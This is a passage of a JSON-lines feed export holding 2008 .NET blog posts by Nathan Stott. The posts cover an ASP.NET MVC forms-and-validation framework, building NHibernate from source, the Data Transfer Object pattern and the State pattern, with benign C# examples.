DotNetKicks.com\" border=\"0\" src=\"http://www.dotnetkicks.com/Services/Images/KickItImageGenerator.ashx?url=http%3a%2f%2fnathan.whiteboard-it.com%2farchive%2f2009%2f01%2f31%2fbuilding-domain-specific-languages-in-boo-by-oren-eini.aspx\" /></a><img src=\"http://nathan.whiteboard-it.com/aggbug/14.aspx\" width=\"1\" height=\"1\" /><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~f/PublicClassWheel?a=2puYpPC6\"><img src=\"http://feeds.feedburner.com/~f/PublicClassWheel?d=1304\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~f/PublicClassWheel?a=9eFGDbOr\"><img src=\"http://feeds.feedburner.com/~f/PublicClassWheel?d=41\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~f/PublicClassWheel?a=I2YKcpkH\"><img src=\"http://feeds.feedburner.com/~f/PublicClassWheel?d=50\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/PublicClassWheel/~4/KwkQV9u4poA\" height=\"1\" width=\"1\"/>","author":"Nathan Stott","_id":{"$wrap":"$oid","v":1045}}
{"k":"0000000084","o":"0000008451","v":"001"}
{"_id":1046,"_uid":1046,"_dt":1373742602877,"_s":"55f81f959316afc4067f06a3a56ae9a7"}
{"subscription":{"$wrap":"$oid","v":36},"link":"http://nathan.whiteboard-it.com/archive/2008/08/10/mvc-forms-framework-with-validation.aspx","title":"Forms Framework with Validation for ASP.NET MVC","published":{"$wrap":"$date","v":1218388129000,"h":"2008-08-10T17:08:49.000Z"},"starred":false,"read":false,"content":"<span style=\"background-color: rgb(255, 255, 153);\"><span style=\"font-weight: bold;\">Update</span>: This project has been open sourced.  See details in</span><a style=\"background-color: rgb(255, 255, 153);\" href=\"http://nathan.whiteboard-it.com/archive/2008/08/17/mvc-forms-with-validation-open-sourced.aspx\">this post</a><span style=\"background-color: rgb(255, 255, 153);\">.</span><br /><br /><span style=\"background-color: rgb(255, 255, 153);\"><span style=\"font-weight: bold;\">Another Update</span>: This article was written using asp.net MVC preview 4.  The better option now is to use<a href=\"http://www.codeplex.com/MVCContrib\">MVCContrib's</a>validators or the MVCContrib fluent html project in general with<a href=\"http://msdn.microsoft.com/en-us/library/system.componentmodel.idataerrorinfo.aspx\">IDataErrorInfo</a>.  I leave this post here as a reference.  Also, if you wish to have a more Django style forms framework, this would be a great starting point.  The code is freely available for anyone who wishes to use it.</span><br /><br />One thing that is notably missing from ASP.NET MVC is a good way to handle forms and their validation.  To resolve this issue, I started on a simple forms framework this weekend.<br /><h3>The end goal</h3><img height=\"193\" width=\"392\" src=\"/images/nathan_whiteboard-it_com/FormFramework/ContactAction.jpg\" alt=\"\" /><br /><br />I don't particularly like the action filter to handle the insertion of the model as a parameter.  I would prefer it be done via windsor and interceptors; however, for the first go round I have decided to keep the castle stack out of this.  The technique could easily be adapted to use MVC Contrib's WindsorControllerFactory and interceptors so that attributes do not have to be on every action you wish to use a form helper with.  More on that later.<br /><br />For those of you who want to skip the reading and get straight to the code,<a href=\"http://nathan.whiteboard-it.com/SampleCode/WB.Forms.zip\">download the sample project</a>.  Look at the /Home/Contact page.<span style=\"font-weight: bold;\">Note</span>: the sample project depends on<a href=\"http://www.codeplex.com/aspnet/Release/ProjectReleases.aspx?ReleaseId=15389\">MVC Preview 4</a>.<br /><h3>The Components</h3><ul><li>Field - A field is the smallest unit of input and validation in a form.</li><li>Widget - A widget is an abstraction of HTML template text for input.</li><li>FormBase - Base class for form helpers.</li><li>ModelForm - A form auto created from a POCO model.</li></ul><h3>Widget</h3>A widget has a name, a value, and some attributes.  The name and value properties are by default shortcuts to the name and value attributes of the widget's attribute collection.  However, this behavior is overridable in subclasses.  A widget also has a way of rendering itself as XHTML.<br /><h3>Field</h3>A field has a name, a value, and a widget.  By default a field is required, and it has a publicly exposed validate method so that it can be asked to validate its value.  It also has the ability to output itself as XHTML.<br /><h3>FormBase</h3>FormBase, the base class for forms contains a collection of fields, a method to validate the fields, and a method to load the values of fields from a name value collection.  The latter facilitates the loading of data from a browser request.<br /><br />The first concrete implementation of FormBase I created was ModelForm.  A ModelForm accepts a generic type argument and in its constructor takes an object of that type.  It uses this object to generate fields for the form.  The generation logic is implemented using the strategy pattern so that it is easily customizable.<br /><br />Here is the strategy interface<br /><br /><img height=\"128\" width=\"342\" src=\"/images/nathan_whiteboard-it_com/FormFramework/IFieldStrategy.jpg\" alt=\"\" /><br /><br />The ModelForm registers default strategies<br /><br /><img height=\"173\" width=\"426\" src=\"/images/nathan_whiteboard-it_com/FormFramework/RegisterStrategies.jpg\" alt=\"\" /><br /><br />The constructor allows you to pass in your own strategies<br /><br /><img height=\"278\" width=\"698\" src=\"/images/nathan_whiteboard-it_com/FormFramework/StrategyCtor.jpg\" alt=\"\" /><br /><br />With that, we have everything we need to make a form from a POCO.<br /><br /><h3>Model Action Filter</h3>One of the neatest things ASP.NET MVC does is allow you to make controllers with parameters that will be filled in from the request.<br /><br />I wanted to be able to do this with my form classes as well.<br /><br />For the first go round, I decided not to use what I would prefer: Windsor and IInterceptors.  Instead I integrated the MVC way by using their action filters.<br /><br />The filters give us everything we need to set the values for a parameter.  We have access to the parameters through the ActionMethod.GetParmaeters() method and we can set the parameters via the ActionParameters dictionary.<br /><br />Here is the action filter<br /><br /><img height=\"321\" width=\"700\" src=\"/images/nathan_whiteboard-it_com/FormFramework/ModelFilterAttribute.jpg\" alt=\"\" /><br /><br />FormFactory is a simple helper class that uses a strategy pattern to create forms based upon the type passed in and a NameValueCollection.<br /><br />Settings filterContext.Action<br /><br />Now, this action will work!<br /><br /><img height=\"193\" width=\"392\" src=\"/images/nathan_whiteboard-it_com/FormFramework/ContactAction.jpg\" alt=\"\" /><br /><br /><h3>Rendering the Form in a View<br /></h3>I provided three canonical methods for rendering the form:<br /><br />AsDiv - renders the form with each field wrapped in a div<br />AsTable - render the form with each field as a table row<br />AsList - render the form with each field as a list item of an unordered list<br /><br />I also provided a AsCustom method that allows you to specify an XElement to wrap the form fields inside of and an XElement to use as the parent for the children generated by the field instances.<br /><br />If you want even more flexibility, the rendering is completely overridable by subclassing.<br /><br />Rendering the form is as simple as passing it to a view and calling AsDiv() or your preferred alternative.<br /><br />All output is valid XHTML.  Invalid fields receive an error class.<br /><br />Rendered<br /><img height=\"309\" width=\"377\" alt=\"\" src=\"/images/nathan_whiteboard-it_com/FormFramework/ContactForm.jpg\" /><br /><br />Validation<br /><img height=\"276\" width=\"468\" alt=\"\" src=\"/images/nathan_whiteboard-it_com/FormFramework/ContactFormValidation.jpg\" /><br /><br /><a href=\"http://nathan.whiteboard-it.com/SampleCode/WB.Forms.zip\">Download the Sample Project</a><br /><span style=\"font-weight: bold;\">Note</span>: the sample project depends on<a href=\"http://www.codeplex.com/aspnet/Release/ProjectReleases.aspx?ReleaseId=15389\">MVC Preview 4</a>.<br /><br /><a href=\"http://www.dotnetkicks.com/kick/?url=http%3a%2f%2fnathan.whiteboard-it.com%2farchive%2f2008%2f08%2f10%2fmvc-forms-framework-with-validation.aspx\"><img border=\"0\" src=\"http://www.dotnetkicks.com/Services/Images/KickItImageGenerator.ashx?url=http%3a%2f%2fnathan.whiteboard-it.com%2farchive%2f2008%2f08%2f10%2fmvc-forms-framework-with-validation.aspx\" alt=\"kick it on DotNetKicks.com\" /></a><img src=\"http://nathan.whiteboard-it.com/aggbug/10.aspx\" width=\"1\" height=\"1\" /><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~f/PublicClassWheel?a=sZU7VkEq\"><img src=\"http://feeds.feedburner.com/~f/PublicClassWheel?d=1304\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~f/PublicClassWheel?a=jjakbosZ\"><img src=\"http://feeds.feedburner.com/~f/PublicClassWheel?d=41\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~f/PublicClassWheel?a=I0WZT94m\"><img src=\"http://feeds.feedburner.com/~f/PublicClassWheel?d=50\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/PublicClassWheel/~4/I8jboFoNwT4\" height=\"1\" width=\"1\"/>","author":"Nathan Stott","_id":{"$wrap":"$oid","v":1046}}
{"k":"0000000084","o":"0000002895","v":"001"}
{"_id":1047,"_uid":1047,"_dt":1373742602878,"_s":"c5e8bd1a0b58cad214e42eb86f1959ef"}
{"subscription":{"$wrap":"$oid","v":36},"link":"http://nathan.whiteboard-it.com/archive/2008/08/04/building-nhibernate-from-source.aspx","title":"Building NHibernate From Source","published":{"$wrap":"$date","v":1217855637000,"h":"2008-08-04T13:13:57.000Z"},"starred":false,"read":false,"content":"Recently, on<a target=\"_blank\" href=\"http://groups.google.com/group/nhusers\">nhusers</a>, the NHibernate users mailing list, I've seen questions from people wishing to get started building NHibernate from source.  Some people are unfamiliar with open source in the .NET world and the tools used for it, so I made this beginner level screencast about how to get started building NHibernate from source.<br /><br />You can download the screencast<a href=\"http://nathan.whiteboard-it.com/SampleCode/nhibernate_from_source_101.zip\">here</a>.<br /><br />Here is a list of the prerequisites you will need to follow along:<br /><ul><li><a target=\"_blank\" href=\"http://nant.sourceforge.net\">NAnt</a><br /></li><li><a target=\"_blank\" href=\"http://nunit.org/index.php\">NUnit</a><br /></li><li><a target=\"_blank\" href=\"http://tortoisesvn.tigris.org/\">TortoiseSVN</a></li><li><a target=\"_blank\" href=\"http://www.testdriven.net/\">TestDriven.NET</a></li></ul>For reference, you can find the official NHibernate document about getting started from source<a target=\"_blank\" href=\"http://www.hibernate.org/428.html\">here</a>.<br /><br /><span style=\"font-weight: bold;\">Note</span>: I realized after I posted this that I forgot to provide a link to the free codec needed to view this screencast.  You will need to d/l the free camstudio lossless codec (<a target=\"_blank\" href=\"http://nathan.whiteboard-it.com/SampleCode/CamStudioCodec10.zip\">here</a>) to view this video.  Extract the files, right click on the .inf, and select install.  You will receive a warning, but it's ok.  This is a widely used screencasting codec and you can find a lot of info about it via google.<br />In the future, I'm going to convert my videos to flash and stream them to make things easier all-around.<br />Sorry for the inconveniance.<img src=\"http://nathan.whiteboard-it.com/aggbug/9.aspx\" width=\"1\" height=\"1\" /><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~f/PublicClassWheel?a=Tbvjpe67\"><img src=\"http://feeds.feedburner.com/~f/PublicClassWheel?d=1304\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~f/PublicClassWheel?a=Z0g6Yka6\"><img src=\"http://feeds.feedburner.com/~f/PublicClassWheel?d=41\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~f/PublicClassWheel?a=RWbQzTH2\"><img src=\"http://feeds.feedburner.com/~f/PublicClassWheel?d=50\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/PublicClassWheel/~4/rf8Cj0gX-PA\" height=\"1\" width=\"1\"/>","author":"Nathan Stott","_id":{"$wrap":"$oid","v":1047}}
{"k":"0000000084","o":"0000009504","v":"001"}
{"_id":1048,"_uid":1048,"_dt":1373742602878,"_s":"f2eadbc495aff82b631f380152d017f6"}
{"subscription":{"$wrap":"$oid","v":36},"link":"http://nathan.whiteboard-it.com/archive/2008/08/23/data-transfer-objects.aspx","title":"Data Transfer Objects","published":{"$wrap":"$date","v":1219550924000,"h":"2008-08-24T04:08:44.000Z"},"starred":false,"read":false,"content":"<h2>Data Transfer Objects Pattern</h2>Data Transfer Objects (DTOs) are a necesarry time-sink when working with<a target=\"_blank\" href=\"http://en.wikipedia.org/wiki/Service-oriented_architecture\">SOA</a>.  Proper SOA dictates that you must not pass domain objects across service boundaries.  In many cases, such as when using an ORM, it is extremely difficult to pass your domain objects across the service boundaries even if you choose to disreguard the SOA guidance.  Also, there may be good reasons why you do not want to make your domain objects serializable.<br /><h3>DTOs Defined</h3>So what exactly are DTOs?  They are objects that have no behavior outside of accessors and mutators of their properties.  Often times DTOs line up one-to-one with domain objects as in the following example.<br /><!-- code formatted by http://manoli.net/csharpformat/ --><pre class=\"csharpcode\"><span class=\"rem\"><br />///&lt;summary&gt;</span><span class=\"rem\"><br />/// Domain Object</span><span class=\"rem\"><br />///&lt;/summary&gt;</span><br /><span class=\"kwrd\">public</span><span class=\"kwrd\">class</span>Company<br />{<br /><span class=\"kwrd\">private</span><span class=\"kwrd\">string</span>name;<br /><span class=\"kwrd\">private</span><span class=\"kwrd\">string</span>taxId;<br /><br /><span class=\"kwrd\">public</span>Company(<span class=\"kwrd\">string</span>name,<span class=\"kwrd\">string</span>taxId)<br />{<br /><span class=\"kwrd\">this</span>.name = name;<br /><span class=\"kwrd\">this</span>.taxId = taxId;<br />}<br /><br /><span class=\"kwrd\">public</span><span class=\"kwrd\">string</span>Name { get {<span class=\"kwrd\">return</span>name; } }<br /><span class=\"kwrd\">public</span><span class=\"kwrd\">string</span>TaxId { get {<span class=\"kwrd\">return</span>taxId; } }<br />}<br /><br /><span class=\"rem\">///&lt;summary&gt;</span><br /><span class=\"rem\">/// Data Transfer Object</span><br /><span class=\"rem\">///&lt;/summary&gt;</span><br /><span class=\"kwrd\">public</span><span class=\"kwrd\">class</span>CompanyDTO<br />{<br /><span class=\"kwrd\">public</span><span class=\"kwrd\">string</span>Name { get; set; }<br /><span class=\"kwrd\">public</span><span class=\"kwrd\">string</span>TaxId { get; set; }<br />}</pre><br />Other times DTOs may need to carry data for a request that has no direct representation as a single object in the domain.  Consider a service that needs to expose data about a company and its owner.  Obviously the clients shouldn't have to request data about the company and then data about the owner in a separate request.  Doing so would incur the costs of two round trips, and the owner data is a part of a single logical unit as exposed by the service.<br /><!-- code formatted by http://manoli.net/csharpformat/ --><pre class=\"csharpcode\"><span class=\"rem\"><br />///&lt;summary&gt;</span><br /><span class=\"rem\">/// A company</span><br /><span class=\"rem\">///&lt;/summary&gt;</span><br /><span class=\"kwrd\">public</span><span class=\"kwrd\">class</span>Company<br />{<br /><span class=\"kwrd\">private</span><span class=\"kwrd\">string</span>name;<br /><span class=\"kwrd\">private</span><span class=\"kwrd\">string</span>taxId;<br /><br /><span class=\"kwrd\">public</span>Company(<span class=\"kwrd\">string</span>name,<span class=\"kwrd\">string</span>taxId)<br />{<br /><span class=\"kwrd\">this</span>.name = name;<br /><span class=\"kwrd\">this</span>.taxId = taxId;<br />}<br /><br /><span class=\"kwrd\">public</span><span class=\"kwrd\">string</span>Name { get {<span class=\"kwrd\">return</span>name; } }<br /><span class=\"kwrd\">public</span><span class=\"kwrd\">string</span>TaxId { get {<span class=\"kwrd\">return</span>taxId; } }<br /><br /><span class=\"kwrd\">public</span>Owner Owner { get; set; }<br />}<br /><br /><span class=\"rem\">///&lt;summary&gt;</span><br /><span class=\"rem\">/// Owner of a company</span><span class=\"rem\"><br />///&lt;/summary&gt;</span><br /><span class=\"kwrd\">public</span><span class=\"kwrd\">class</span>Owner<br />{<br /><span class=\"kwrd\">public</span>Company Company { get; set; }<br /><br /><span class=\"kwrd\">public</span><span class=\"kwrd\">string</span>FirstName { get; set; }<br /><span class=\"kwrd\">public</span><span class=\"kwrd\">string</span>LastName { get; set; }<br />}<br /><br /><span class=\"rem\">///&lt;summary&gt;</span><span class=\"rem\"><br />/// Data Transfer Object</span><br /><span class=\"rem\">///&lt;/summary&gt;</span><br /><span class=\"kwrd\">public</span><span class=\"kwrd\">class</span>CompanyDTO<br />{<br /><span class=\"kwrd\">public</span><span class=\"kwrd\">string</span>Name { get; set; }<br /><span class=\"kwrd\">public</span><span class=\"kwrd\">string</span>TaxId { get; set; }<br /><br /><span class=\"kwrd\">public</span><span class=\"kwrd\">string</span>OwnerName { get; set; }<br />}</pre><h3>From Domain Object to DTO and Back Again</h3>The assembler pattern, a subset of the mapping pattern, is used to translate DTOs to and from domain objects.<br /><br /><img height=\"204\" width=\"231\" alt=\"\" src=\"/images/nathan_whiteboard-it_com/DTO Pattern/AssemblerPattern.jpg\" /><br /><br />It is possible to create a reusable conventions based assembler.  I will talk more about this in the future.  For small projects, the cost of creating assemblers for the DTOs is trivial.  For larger ones, it is still worth the effort for the sake of encapsulation.<br /><!-- code formatted by http://manoli.net/csharpformat/ --><pre class=\"csharpcode\"><span class=\"rem\"><br />///&lt;summary&gt;</span><span class=\"rem\"><br />/// Assembler for Company and CompanyDTO.</span><br /><span class=\"rem\">///&lt;/summary&gt;</span><br /><span class=\"kwrd\">public</span><span class=\"kwrd\">interface</span>ICompanyAssembler<br />{<br />CompanyDTO Convert(Company company);<br />Company Convert(CompanyDTO DTO);<br />}<br /></pre><h3>What is so useful about an object that has no behavior?</h3>DTOs may seem like weak objects because of their lack of behavior; but this is what makes them the one object that is safe to pass across a service boundary.  A client that interacts with your service may, and often will, have a different domain from the service itself.  In fact, many different clients with many different domains may interact with your service.  It is difficult and undesirable to share the same domain model between a service and all its potential clients.<br /><br />Consider again the Company example.  Let us assume that the service we are writing is a better business bureau catalog of companies.  The domain object, Company, may include such methods as \"FileComplaint\" or \"RevokeLicense.\"<br /><br />This service may be consumed by an auction site that wants to use the companies names and ratings but has no need to file complaints and does not have the ability to revoke a license.  The company domain object for the auction site will include methods such as \"AddAuction\" or \"AssociateWithReview.\"<br /><br />Sharing the domain objects between the auction site and the better business bureau service would pollute both domains; not to mention the fact that they may, and in this example certainly would, have different owners who do not wish to share code bases.<br /><br />Sharing DTOs, because of their lack of behavior, works fine though.  The DTOs serve as a simple, abstracted definition for the data that the service and its clients must exchange.<br /><br /><img height=\"262\" width=\"611\" src=\"/images/nathan_whiteboard-it_com/DTO Pattern/BBBExample(1).jpg\" alt=\"\" /><br /><br />DTOs also insulate your service clients from changes to the domain of the service and vice versa.  You are free to change your domain objects as much as you want and leave the DTOs alone.  The assembler can simply be updated as the domain objects are updated.<br /><br />If the domain objects were shared by the clients, every change to a domain object would directly impact clients, greatly increasing the costs of maintaining the service.<br /><br /><a href=\"http://www.dotnetkicks.com/kick/?url=http%3a%2f%2fnathan.whiteboard-it.com%2farchive%2f2008%2f08%2f23%2fdata-transfer-objects.aspx\"><img border=\"0\" src=\"http://www.dotnetkicks.com/Services/Images/KickItImageGenerator.ashx?url=http%3a%2f%2fnathan.whiteboard-it.com%2farchive%2f2008%2f08%2f23%2fdata-transfer-objects.aspx\" alt=\"kick it on DotNetKicks.com\" /></a><img src=\"http://nathan.whiteboard-it.com/aggbug/12.aspx\" width=\"1\" height=\"1\" /><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~f/PublicClassWheel?a=HI9w8pOZ\"><img src=\"http://feeds.feedburner.com/~f/PublicClassWheel?d=1304\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~f/PublicClassWheel?a=fQg30eMT\"><img src=\"http://feeds.feedburner.com/~f/PublicClassWheel?d=41\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~f/PublicClassWheel?a=7WMhTUYW\"><img src=\"http://feeds.feedburner.com/~f/PublicClassWheel?d=50\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/PublicClassWheel/~4/GtbT4ZHPKn8\" height=\"1\" width=\"1\"/>","author":"Nathan Stott","_id":{"$wrap":"$oid","v":1048}}
{"k":"0000000084","o":"0000002630","v":"001"}
{"_id":1049,"_uid":1049,"_dt":1373742602880,"_s":"de731d38fe32e029e9e9b35f1a20a5b2"}
{"subscription":{"$wrap":"$oid","v":36},"link":"http://nathan.whiteboard-it.com/archive/2008/08/17/mvc-forms-with-validation-open-sourced.aspx","title":"MVC Forms WIth Validation Open Sourced","published":{"$wrap":"$date","v":1219008330000,"h":"2008-08-17T21:25:30.000Z"},"starred":false,"read":false,"content":"I've set up a google code repository<a target=\"_blank\" href=\"http://code.google.com/p/mvc-forms/\">here</a>for the ASP.NET MVC Forms With Validation framework I discussed in<a href=\"http://nathan.whiteboard-it.com/archive/2008/08/10/mvc-forms-framework-with-validation.aspx\">this post</a>.<br /><br />I have made some alterations to it since the post that I will review in a later posting.<br /><br />Briefly, the major changes are as follows:<br /><ol><li>Multiple fieldsets are now supported in the forms.</li><li>I have taken the first steps towards supporting objects that contain child objects.  A 1-1 relationship is supported in the current revision.  A new fieldset is generated for each child object.</li><li>Strategies have been revamped so that they no longer are mapped to types.  Now a strategy is allowed to return null if it does not want to handle a property descriptor passed to it.  If it returns null, the next strategy in the list will be tried.</li></ol>Check it out.  Tell me what you think.  I am accepting patches and if you want to be a contributor, contact me through the contact form on this blog.<br /><br /><a href=\"http://www.dotnetkicks.com/kick/?url=http%3a%2f%2fnathan.whiteboard-it.com%2farchive%2f2008%2f08%2f17%2fmvc-forms-with-validation-open-sourced.aspx\"><img src=\"http://www.dotnetkicks.com/Services/Images/KickItImageGenerator.ashx?url=http%3a%2f%2fnathan.whiteboard-it.com%2farchive%2f2008%2f08%2f17%2fmvc-forms-with-validation-open-sourced.aspx\" border=\"0\" alt=\"kick it on DotNetKicks.com\" /></a><img src=\"http://nathan.whiteboard-it.com/aggbug/11.aspx\" width=\"1\" height=\"1\" /><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~f/PublicClassWheel?a=oUwyny1Y\"><img src=\"http://feeds.feedburner.com/~f/PublicClassWheel?d=1304\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~f/PublicClassWheel?a=R8aS9XpQ\"><img src=\"http://feeds.feedburner.com/~f/PublicClassWheel?d=41\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~f/PublicClassWheel?a=hNhqi8Ku\"><img src=\"http://feeds.feedburner.com/~f/PublicClassWheel?d=50\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/PublicClassWheel/~4/hmt_MthrMv8\" height=\"1\" width=\"1\"/>","author":"Nathan Stott","_id":{"$wrap":"$oid","v":1049}}
{"k":"0000000084","o":"0000011155","v":"001"}
{"_id":1050,"_uid":1050,"_dt":1373742602880,"_s":"240b6a8aeeaf789115dc6a7e376f6e94"}
{"subscription":{"$wrap":"$oid","v":36},"link":"http://nathan.whiteboard-it.com/archive/2008/09/01/state-pattern.aspx","title":"State Pattern","published":{"$wrap":"$date","v":1220299944000,"h":"2008-09-01T20:12:24.000Z"},"starred":false,"read":false,"content":"<h3>State Pattern</h3>The state pattern is a behavioral pattern that allows an object to partially change its type at runtime.  This is useful in situations where we can not change the type of a base object, but wish to represent the state of it in encapsulated classes.<br /><br />Let us consider a payroll system where employees are compensated and promoted based upon their current position.<br />We could use a property to store the employees current position.<br /><br /><!-- code formatted by http://manoli.net/csharpformat/ --><pre class=\"csharpcode\"><span class=\"kwrd\">public</span><span class=\"kwrd\">class</span>Employee<br />{<br /><span class=\"kwrd\">public</span><span class=\"kwrd\">string</span>Name { get; set; }<br /><br /><span class=\"kwrd\">public</span>EmployeePosition Position { get; set; }<br /><br /><span class=\"kwrd\">public</span><span class=\"kwrd\">void</span>Promote()<br />{<br /><span class=\"kwrd\">switch</span>(Position)<br />{<br /><span class=\"kwrd\">case</span>EmployeePosition.JuniorDeveloper:<br />Position = EmployeePosition.SeniorDeveloper;<br /><span class=\"kwrd\">break</span>;<br /><span class=\"kwrd\">case</span>EmployeePosition.SeniorDeveloper:<br />Position = EmployeePosition.TechnicalLead;<br /><span class=\"kwrd\">break</span>;<br /><span class=\"kwrd\">case</span>EmployeePosition.TechnicalLead:<br /><span class=\"rem\">// This is as high as it goes.</span><span class=\"kwrd\"><br />break</span>;<br />}<br />}<br /><br /><span class=\"kwrd\">public</span><span class=\"kwrd\">void</span>Compensate(Accounting accounting)<br />{<br /><span class=\"kwrd\">int</span>salary = 0;<br /><br /><span class=\"kwrd\">switch</span>(Position)<br />{<br /><span class=\"kwrd\">case</span>EmployeePosition.JuniorDeveloper:<br />salary = 40000;<br /><span class=\"kwrd\">break</span>;<br /><span class=\"kwrd\">case</span>EmployeePosition.SeniorDeveloper:<br />salary = 75000;<br /><span class=\"kwrd\">break</span>;<br /><span class=\"kwrd\">case</span>EmployeePosition.TechnicalLead:<br />salary = 100000;<br /><span class=\"kwrd\">break</span>;<br />}<br /><br />accounting.Pay(<span class=\"kwrd\">this</span>, salary);<br />}<br />}<br /><br /><span class=\"kwrd\">public</span><span class=\"kwrd\">enum</span>EmployeePosition<br />{<br />JuniorDeveloper,<br />SeniorDeveloper,<br />TechnicalLead<br />}<br /><br /><span class=\"kwrd\">public</span><span class=\"kwrd\">class</span>Accounting<br />{<br /><span class=\"kwrd\">public</span><span class=\"kwrd\">void</span>Pay(Employee employee,<span class=\"kwrd\">int</span>dollars)<br />{<br /><span class=\"rem\">// Pay the employee</span><br />}<br />}</pre>This code is brittle.  Changing the EmployeePosition enum requires changing multiple methods in the Employee domain object.  The logic is spread thin and the encapsulation is non-existent.<br /><h3>A Better Way</h3>A better way to do this is to use the state pattern.  With the state pattern, the EmployeePosition enum is replaced by an abstract class representing the employees current position.<br /><!-- code formatted by http://manoli.net/csharpformat/ --><pre class=\"csharpcode\"><span class=\"kwrd\">public</span><span class=\"kwrd\">abstract</span><span class=\"kwrd\">class</span>AbstractEmploymentState<br />{<br /><span class=\"kwrd\">private</span><span class=\"kwrd\">readonly</span>Employee employee;<br /><br /><span class=\"kwrd\">public</span>AbstractEmploymentState(Employee employee)<br />{<br /><span class=\"kwrd\">this</span>.employee = employee;<br />}<br /><br /><span class=\"kwrd\">protected</span><span class=\"kwrd\">virtual</span>Employee Employee { get {<span class=\"kwrd\">return</span>employee; } }<br /><br /><span class=\"kwrd\">public</span><span class=\"kwrd\">abstract</span><span class=\"kwrd\">void</span>Promote();<br /><br /><span class=\"kwrd\">public</span><span class=\"kwrd\">abstract</span><span class=\"kwrd\">void</span>Compensate(Accounting accounting);<br />}<br /><br /><span class=\"kwrd\">public</span><span class=\"kwrd\">class</span>Employee<br />{<br /><span class=\"kwrd\">private</span>AbstractEmploymentState employmentState;<br /><span class=\"kwrd\">public</span><span class=\"kwrd\">string</span>Name { get; set; }<br /><br /><span class=\"kwrd\">public</span>AbstractEmploymentState EmploymentState<br />{<br />get {<span class=\"kwrd\">return</span>employmentState; }<br />set { employmentState =<span class=\"kwrd\">value</span>; }<br />}<br /><br /><span class=\"kwrd\">public</span><span class=\"kwrd\">void</span>Promote()<br />{<br />EmploymentState.Promote();<br />}<br /><br /><span class=\"kwrd\">public</span><span class=\"kwrd\">void</span>Compensnate(Accounting accounting)<br />{<br />EmploymentState.Compensate(accounting);<br />}<br />}<br /><br /><span class=\"kwrd\">public</span><span class=\"kwrd\">class</span>JuniorDeveloperState: AbstractEmploymentState<br />{<br /><span class=\"kwrd\">public</span>JuniorDeveloperState(Employee employee) :<span class=\"kwrd\">base</span>(employee)<br />{<br />}<br /><br /><span class=\"kwrd\">public</span><span class=\"kwrd\">override</span><span class=\"kwrd\">void</span>Promote()<br />{<br />Employee.EmploymentState =<span class=\"kwrd\">new</span>SeniorDeveloperState(Employee);<br />}<br /><br /><span class=\"kwrd\">public</span><span class=\"kwrd\">override</span><span class=\"kwrd\">void</span>Compensate(Accounting accounting)<br />{<br />accounting.Pay(Employee, 40000);<br />}<br />}<br /><br /><span class=\"kwrd\">public</span><span class=\"kwrd\">class</span>SeniorDeveloperState: AbstractEmploymentState<br />{<br /><span class=\"kwrd\">public</span>SeniorDeveloperState(Employee employee) :<span class=\"kwrd\">base</span>(employee)<br />{<br />}<br /><br /><span class=\"kwrd\">public</span><span class=\"kwrd\">override</span><span class=\"kwrd\">void</span>Promote()<br />{<br />Employee.EmploymentState =<span class=\"kwrd\">new</span>TechinicalLeadState(Employee);<br />}<br /><br /><span class=\"kwrd\">public</span><span class=\"kwrd\">override</span><span class=\"kwrd\">void</span>Compensate(Accounting accounting)<br />{<br />accounting.Pay(Employee, 75000);<br />}<br />}<br /><br /><span class=\"kwrd\">public</span><span class=\"kwrd\">class</span>TechinicalLeadState: AbstractEmploymentState<br />{<br /><span class=\"kwrd\">public</span>TechinicalLeadState(Employee employee) :<span class=\"kwrd\">base</span>(employee)<br />{<br />}<br /><br /><span class=\"kwrd\">public</span><span class=\"kwrd\">override</span><span class=\"kwrd\">void</span>Promote()<br />{<br /><span class=\"rem\">// Do Nothing, this is as high as it goes for now.</span><br />}<br /><br /><span class=\"kwrd\">public</span><span class=\"kwrd\">override</span><span class=\"kwrd\">void</span>Compensate(Accounting accounting)<br />{<br />accounting.Pay(Employee, 100000);<br />}<br />}<br /><br /><span class=\"kwrd\">public</span><span class=\"kwrd\">class</span>Accounting<br />{<br /><span class=\"kwrd\">public</span><span class=\"kwrd\">void</span>Pay(Employee employee,<span class=\"kwrd\">int</span>dollars)<br />{<br /><span class=\"rem\">// Pay the employee</span><br />}<br />}</pre>In this example, employees are compensated and promoted based upon their positions.  The domain object, Employee, delegates these actions to the AbstractEmploymentState object.<br /><br />Note how simplified the Promote and Compensate methods of Employee are:<br /><pre class=\"csharpcode\"><span class=\"kwrd\">public</span><span class=\"kwrd\">void</span>Promote()<br />{<br />EmploymentState.Promote();<br />}<br /><br /><span class=\"kwrd\">public</span><span class=\"kwrd\">void</span>Compensate(Accounting accounting)<br />{<br />EmploymentState.Compensate(accounting);<br />}</pre>Adding a new state, or increasing the complexity of the logic involved in compensation and promotion of the Employees is encapsulated, leaving the design flexible.<br /><h3>Polymorphic Employee</h3>Ok, so polymorphism is good.  Every OO programmer knows that, right?  So why don't we just make the Employee class polymorphic with subclasses for each position i.e. JuniorDeveloper, SeniorDeveloper, and TechnicalLead are all classes that inherit from Employee and implement the appropriate Compensate and Promote logic.<br /><br />In this case, implementing the promote logic in the subclasses would be quite challenging as we can not change the type of a class at runtime.  It could be done by changing the Promote method signature to return an Employee.  The subclasses could then each implement Promote that returned an appropriate subclass of employee.  However, this solution feels contrived.  It is also more difficult to understand for a future maintenance programmer and could lead to hard to find bugs.<br /><br />Another reason we may not wish to have a polymoprhic Employee class is because there may be multiple state objects in a single domain object.  What if we need not only to compensate and 